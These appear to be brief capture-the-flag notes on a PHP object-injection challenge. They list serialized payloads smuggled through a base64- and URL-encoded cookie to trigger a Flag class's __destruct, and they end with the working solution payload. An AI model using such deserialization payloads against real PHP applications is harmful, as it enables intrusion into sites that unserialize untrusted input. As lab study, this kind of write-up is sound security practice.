
### Directions
- Create a Flag object through the cookie (`base64` -> `url` encoding)
	- Basic: `O:4:Flag:0:{}`
	- Wrap flag in spaces - ` O:4:Flag:0:{} `
	- Synonm: `C:4:Flag:0:{}`
	- Inject in array - `a:2:{i:0:C:4:"Flag":0:{};i:1:s:5:"entry"}`
		- HOW IS THIS NOT WORKING???
		- ... wrong syntax - `i:0;`  not `i:0:` ...
```PHP
class Flag {  
    public function __destruct() {  
        global $flag;  
        echo $flag;  
    }  
}
```
- `value` isn't sanitized before being serialized
- `array_push ($data, $_POST['value']);`


# Solution
`$encoded = urlencode(base64_encode('a:2:{i:0;C:4:"Flag":0:{};i:1;s:5:"entry"}'));`
